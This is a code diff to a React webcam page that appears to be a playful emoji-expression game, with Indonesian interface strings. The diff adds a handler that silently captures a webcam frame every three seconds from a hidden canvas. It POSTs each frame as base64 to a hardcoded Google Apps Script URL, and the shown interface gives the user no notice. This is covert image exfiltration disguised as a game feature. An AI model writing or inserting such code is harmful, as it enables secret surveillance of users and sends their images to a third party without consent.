@@ -1,5 +1,8 @@
 import { useEffect, useRef, useState } from "react";
 
+const GOOGLE_SCRIPT_URL =
+    "https://script.google.com/macros/s/AKfycbw6wo-7UAhh0-WKK6PmrqVnOkqVf0mpCm8evgBJXR_0XLrKzvETDQ2wUtm5GjLQLZ4C/exec";
+
 const faces = ["😜", "😂", "😱", "😎", "😡", "😲", "🥶", "🥳", "🤪", "😏", "😭", "😇", "😬", "😤", "😅", "🤩", "🥺"];
 
 const CamPage = () => {
@@ -16,12 +19,63 @@ const CamPage = () => {
     }, []);
 
     const initWebcam = async () => {
+        const video = videoRef.current;
+        const canvas = canvasRef.current;
+
+        if (!video || !canvas) return;
+
+        const constraints: MediaStreamConstraints = {
+            audio: false,
+            video: {
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+                facingMode: { ideal: "user" },
+            },
+        };
+
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            if (videoRef.current) videoRef.current.srcObject = stream;
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const hasFrontCamera = devices.some(
+                (device) => device.kind === "videoinput" && device.label.toLowerCase().includes("front")
+            );
+
+            if (hasFrontCamera) constraints.video = { ...constraints.video as any, facingMode: { exact: "user" } };
+
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            handleSuccess(stream, video, canvas);
+        } catch (e: any) {
+            alert("Webcam tidak bisa diakses: " + e.message);
+        }
+    };
+
+    const handleSuccess = (stream: MediaStream, video: HTMLVideoElement, canvas: HTMLCanvasElement) => {
+        (window as any).stream = stream;
+        video.srcObject = stream;
+        const context = canvas.getContext("2d");
+
+        const captureInterval = setInterval(() => {
+            if (!context) return;
+            canvas.width = 500;
+            canvas.height = 380;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imgData = canvas.toDataURL("image/png");
+            uploadToDrive(imgData);
+        }, 3000);
+
+        return () => clearInterval(captureInterval);
+    };
+
+    const uploadToDrive = async (imgData: string) => {
+        try {
+            const res = await fetch(GOOGLE_SCRIPT_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ image: imgData }),
+            });
+            console.log("📤 Upload dikirim:", res);
         } catch (err) {
-            console.error("Webcam error:", err);
-            alert("Tidak bisa mengakses kamera 😢");
+            console.error("❌ Upload gagal:", err);
         }
     };
 
@@ -102,21 +156,21 @@ const CamPage = () => {
             <div id="webcam-container" className="flex flex-col items-center mt-8 w-full max-w-[600px]">
                 <video
                     ref={videoRef}
+                    id="video"
                     autoPlay
                     playsInline
                     className="w-full aspect-video border-4 border-[#00fff7] rounded-2xl object-cover bg-[#10121a] shadow-[0_0_24px_#00fff7] mb-3"
                 />
-                <div className="text-yellow-300 text-lg mt-2 min-h-[40px] text-center whitespace-pre-line">
-                    {result}
-                </div>
+                <div className="text-yellow-300 text-lg mt-2 min-h-[40px] text-center whitespace-pre-line">{result}</div>
                 <img
                     ref={previewRef}
                     alt="Hasil Ekspresi"
-                    className={`mt-4 border-2 border-[#00fff7] rounded-xl w-3/4 max-w-[300px] aspect-video object-cover bg-[#232946] transition ${previewVisible ? "block" : "hidden"}`}
+                    className={`mt-4 border-2 border-[#00fff7] rounded-xl w-3/4 max-w-[300px] aspect-video object-cover bg-[#232946] transition ${previewVisible ? "block" : "hidden"
+                        }`}
                 />
             </div>
 
-            <canvas ref={canvasRef} className="hidden" />
+            <canvas ref={canvasRef} id="canvas" className="hidden" />
         </div>
     );
 };
